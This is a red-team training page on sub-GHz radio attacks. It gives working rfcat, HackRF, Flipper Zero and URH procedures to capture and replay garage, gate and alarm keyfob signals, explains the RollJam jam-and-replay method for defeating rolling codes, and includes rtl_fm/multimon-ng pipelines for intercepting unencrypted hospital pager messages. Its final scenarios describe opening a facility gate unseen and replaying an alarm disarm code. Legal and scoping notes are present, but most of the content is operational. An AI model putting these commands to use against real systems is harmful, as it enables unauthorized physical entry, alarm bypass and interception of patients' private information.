---
layout: training-page
title: "Sub-GHz RF Attacks — Red Team Academy"
module: "Wireless"
tags: [sub-ghz, sdr, hackrf, yard-stick-one, replay-attack, rolling-code, flipper-zero, 433mhz]
page_key: "wireless-sub-ghz-attacks"
render_with_liquid: false
updated: "2026-04-17"
---

# Sub-GHz RF Attacks

## Overview

Sub-GHz radio frequencies carry a wide range of physical access control and sensor systems that are routinely overlooked in physical penetration tests. Garage doors, barrier gates, alarm keyfobs, wireless sensors, and pager systems all operate in this spectrum — often with no encryption, no rolling codes, and no replay protection. A red team operator with a $50 RTL-SDR dongle or a Flipper Zero can clone access remotes, intercept unencrypted pager communications, and open physical barriers in ways that traditional security assessments never examine.

**Legal note**: Intercepting communications without authorization is illegal in most jurisdictions. All testing must be performed on equipment you own or with explicit written authorization. Transmitting on licensed frequencies without a license may violate FCC, Ofcom, or equivalent regulations.

## Sub-GHz Spectrum Overview

Understanding which frequencies are relevant to your target geography and target type is the first step.

```
# Key sub-GHz bands and their uses:

# 315 MHz — United States / Canada
# - Garage door openers (large installed base of legacy remotes)
# - Automotive keyless entry (many pre-2010 vehicles)
# - Some alarm system keyfobs
# - Legacy temperature/humidity sensors

# 433.92 MHz — Europe, Asia, Australia, worldwide
# - Garage doors, gates, barriers (most common globally)
# - Wireless doorbells
# - Weather stations, temperature sensors
# - Tire Pressure Monitoring Systems (TPMS)
# - Some alarm keyfobs
# - ASK/OOK modulation most common

# 868.35 MHz — Europe (ISM band)
# - Z-Wave home automation devices
# - European alarm systems (some)
# - Wireless sensors in smart buildings
# - LoRa IoT sensors

# 915 MHz — United States (ISM band)
# - LoRa/LoRaWAN IoT sensors (industry, agriculture)
# - Some Z-Wave US devices
# - RFID systems
# - Industrial sensor networks

# Other sub-GHz:
# 418 MHz — UK garage doors (older)
# 303 MHz — Some US remotes (less common)
# 390 MHz — Some alarm remotes
```

## Hardware

```
# RTL-SDR (receive-only) — ~$25-30
# Based on Realtek RTL2832U TV tuner chip
# Frequency range: 500 kHz – 1.75 GHz (with upconverter for lower)
# Receive only — cannot transmit
# Best for: passive recon, signal analysis, OSINT
# Recommended: RTL-SDR Blog V4 (improved noise floor)

# YARD Stick One — ~$100
# Sub-GHz transceiver for 300-348 MHz, 391-464 MHz, 782-928 MHz
# Based on TI CC1111 chip
# Full TX and RX capability
# Controlled via rfcat Python library
# Best for: replay attacks, signal injection, custom protocol interaction

# HackRF One — ~$350 (or ~$60 clones)
# Wideband transceiver: 1 MHz – 6 GHz
# Half-duplex (TX or RX, not simultaneous)
# 20 Msps sample rate
# GNU Radio compatible
# Best for: wideband capture, advanced modulation analysis, custom attacks

# Flipper Zero — ~$170
# Portable multi-tool with built-in sub-GHz module
# Supports 300-928 MHz
# Read/record/replay RF signals with one button press
# Built-in frequency analyzer
# No Linux/SDR knowledge required — ideal for field use
# Caution: Flipper firmwares may impose regional frequency restrictions

# GQRX — GUI SDR receiver for Linux/Mac
# Real-time spectrum display, demodulation, audio output
# pip install gqrx or package manager install
```

## GNU Radio Workflow

GNU Radio is the signal processing framework underlying most SDR-based attacks. Understanding the basic workflow — identify, demodulate, decode — applies to all sub-GHz signal analysis.

```
# Install GNU Radio:
sudo apt install gnuradio gqrx-sdr

# --- Step 1: Identify the signal frequency ---
# Open GQRX:
gqrx
# Configure: Device = RTL-SDR, Sample Rate = 2.048M
# Tune around target frequency (e.g., 433.92 MHz)
# Press the garage remote or keyfob near antenna
# Signal appears as vertical spike in waterfall display
# Center the spike to read exact frequency

# --- Step 2: Determine modulation ---
# Most simple remotes: OOK (On-Off Keying) — a subset of ASK
# OOK: carrier on = 1, carrier off = 0
# Visual signature in GQRX: FM demodulation sounds like pulses/clicks
# FSK: two frequencies for 0 and 1 — audio sounds like two tones alternating
# PSK: phase shifts — harder to see in GQRX waterfall

# --- Step 3: Capture IQ samples ---
# From command line with RTL-SDR:
rtl_sdr -f 433920000 -s 250000 -g 30 capture.iq
# -f = center frequency in Hz
# -s = sample rate (250 ksps sufficient for most narrow-band sub-GHz)
# -g = gain (adjust until signal is visible without saturation)
# Record while pressing the target remote 5-10 times

# --- Step 4: Analyze in Universal Radio Hacker (URH) ---
pip3 install urh
urh &
# File → Open → select capture.iq
# URH auto-detects modulation → shows decoded bits in Analysis tab
# Manually identify: preamble pattern, sync word, data payload, checksum
```

## Replay Attacks

A replay attack captures an RF signal from a legitimate remote and re-transmits it verbatim. Works against systems without rolling codes or counters — which includes a large proportion of installed garage doors, barriers, and alarm keyfobs.

```
# --- Capture with YARD Stick One (rfcat) ---
pip install rfcat

# Enter rfcat interactive Python shell:
rfcat -r

# Configure receiver for 433.92 MHz OOK:
d.setFreq(433920000)          # Set frequency
d.setMdmModulation(MOD_ASK_OOK)  # ASK/OOK modulation
d.setMdmDRate(4800)           # Data rate (adjust based on signal)
d.setMdmSyncMode(SYNCM_NONE)  # No sync word filtering
d.setMdmNumPreamble(0)
d.setMaxPower()
d.setRxChipEnable()

# Receive data:
pkt = d.RFrecv()
print(pkt[0].hex())           # Raw bytes of captured signal

# --- Replay the captured signal ---
# Convert hex bytes to bytearray and transmit:
payload = bytes.fromhex("CAPTURED_HEX_HERE")
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMaxPower()
d.RFxmit(payload, repeat=3)   # Transmit 3 times to ensure gate receives

# --- Flipper Zero replay (no coding required) ---
# Flipper Zero Sub-GHz app:
# 1. Open Sub-GHz → Read → point at remote → press button
# 2. Flipper displays decoded signal (frequency, modulation, data)
# 3. Save → Send → replays the captured signal
# Works on: most simple OOK/ASK 433MHz remotes without rolling codes

# --- GNU Radio replay ---
# Capture with rtl_sdr → transmit with HackRF:
hackrf_transfer -t capture.iq -f 433920000 -s 8000000 -x 47
# -t = transmit (input file)
# -f = frequency
# -s = sample rate (match capture)
# -x = TX VGA gain (0-47)
```

## Rolling Code Analysis and RollJam

Rolling codes (KeeLoq algorithm, used in high-security garage remotes, automotive keyfobs, and some alarm keyfobs) change the transmitted code with each button press. A simple replay of a captured signal does not work because the code was already consumed. However, the RollJam attack by Samy Kamkar defeats rolling codes without cryptanalysis.

```
# --- KeeLoq rolling codes — how they work ---
# Each remote generates a new code using LFSR-based KeeLoq cipher
# The receiver maintains a synchronization window (accepts codes N±k)
# Simple replay: receiver rejects already-used code
# KeeLoq is cryptographically weak — known-plaintext attacks exist in research
# Practical KeeLoq attacks require large numbers of observed codes
# Automotive grade: harder — uses 64-bit manufacturer keys

# --- RollJam attack (Samy Kamkar, DEF CON 2015) ---
# Concept: jam + capture two consecutive codes; replay the second when needed
#
# Phase 1 (jamming + capture code 1):
# Attacker holds a jammer near the target keyfob
# User presses button → signal is jammed (never reaches receiver) → user thinks it failed
# Simultaneously: attacker captures the transmitted code (despite jamming, receiver missed it)
#
# Phase 2 (second press — capture code 2):
# User presses button again → attacker captures code 2, replays code 1 immediately
# Receiver accepts code 1 (still valid) → gate opens → user unaware
# Attacker holds code 2 (still unconsumed — receiver never saw it)
#
# Phase 3 (use at any time):
# Attacker transmits code 2 → receiver accepts → gate opens

# RollJam implementation requirements:
# - Device that can simultaneously jam and receive (two radios or half-duplex timing)
# - HackRF + YARD Stick One combination
# - Jammer transmits on target frequency, YARD Stick One receives
# - Timing critical: capture window ~1ms during jammed transmission

# OPSEC note: RollJam requires physical proximity and ~2 presses from victim
# Real-world deployment: hidden in parking lot near target vehicle/gate
```

## OOK Signal Decoding with URH

Universal Radio Hacker simplifies the analysis of captured RF signals without requiring GNU Radio block diagram knowledge. It handles demodulation, bit extraction, and protocol reconstruction automatically.

```
# Install URH:
pip install urh
# Or: sudo apt install python3-urh

# --- URH analysis workflow ---

# 1. Open capture file:
# File → Open Signal → select .iq or .wav or .complex file
# Set sample rate to match capture (e.g., 250000)
# Set center frequency to 433920000

# 2. Auto-detection:
# URH analyzes signal → suggests: ASK/OOK, FSK, PSK
# Adjust "Error tolerance" if demodulation looks wrong

# 3. Identify preamble and sync:
# Zoom into first pulse train
# Preamble: alternating 1/0 pattern before actual data
# Sync word: fixed pattern marking start of data
# Example preamble: 10101010 10101010
# Example sync: 11100001

# 4. Set bit length:
# URH shows "Bit length" — samples per bit
# Adjust until bits look clean (no half-bits or merges)

# 5. Analysis tab:
# Paste raw bits → identify fields manually
# Example 433MHz remote bit stream:
# 1010101010101010 11100001 [8-bit address] [8-bit address inverted] [4-bit command] [checksum]
# Mark each field with labels in URH for documentation

# 6. Generate raw signal for replay:
# Protocol → Generate → exports modulated IQ file
# Transmit with HackRF: hackrf_transfer -t output.iq -f 433920000 -s 8000000 -x 47

# URH also supports: POCSAG, FLEX, Z-Wave decoding via built-in decoders
```

## POCSAG / Pager Sniffing

Hospitals, utilities, and industrial facilities still use pager networks broadcasting on 152-160 MHz (US) and 466-470 MHz (EU). These transmissions are typically unencrypted and contain patient information, operational alerts, and authentication codes.

```
# POCSAG decode with RTL-SDR + multimon-ng:

# Capture pager frequency (US hospitals: ~152.0-157.0 MHz):
rtl_fm -f 152.1e6 -s 22050 - | multimon-ng -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -t raw /dev/stdin

# Common pager frequencies (US):
# 152.000 MHz - 157.450 MHz — VHF paging band
# 929-932 MHz — UHF paging (Arch Wireless / USA Mobility)
# 462-467 MHz — UHF paging

# European pager frequencies:
# 153.0 MHz, 466.075 MHz, 466.175 MHz — POCSAG

# multimon-ng output format:
# POCSAG1200: Address: 1234567  Function: 0
# Alpha:   PATIENT JOHN DOE RM 204 CARDIAC ARREST CODE BLUE

# FLEX protocol (higher capacity, used by many carriers):
rtl_fm -f 929.9375e6 -s 22050 - | multimon-ng -a FLEX -t raw /dev/stdin

# Automated scanning with PDW (Windows):
# PDW monitors pager frequencies and logs all received messages
# Supports: POCSAG 512/1200/2400, FLEX, ERMES
```

## Practical Attack Scenarios

```
# --- Physical Pentest: Opening a Gate or Barrier ---
# Objective: access a parking structure or secure facility entrance
# Method: clone the gate remote used by authorized personnel

# Phase 1 - Passive recon:
# Observe facility from public area
# Note: remote type (single button vs multi-button)
# Use Flipper Zero frequency analyzer to identify active frequencies
# When authorized user operates gate → note frequency shown on Flipper

# Phase 2 - Signal capture:
# Position near gate entrance with YARD Stick One or Flipper
# When next authorized user presses remote: capture signal
# If no rolling codes (common in older commercial barriers):
#   → Immediate replay opens gate

# Phase 3 - Verify access:
# Wait for no witnesses → transmit replayed signal
# Gate opens → proceed into facility

# --- Alarm System Keyfob Disarm ---
# Some alarm systems accept keyfob disarm signals via 433 MHz
# Capture disarm signal when owner disarms system
# Replay signal before next patrol → motion sensors inactive during assessment

# --- Assessment scoping note ---
# Physical pentest RoE must explicitly include RF/wireless attacks
# Document frequency, modulation, and tool used for each captured signal
# Photograph gate/barrier and note exact coordinates for report evidence
```
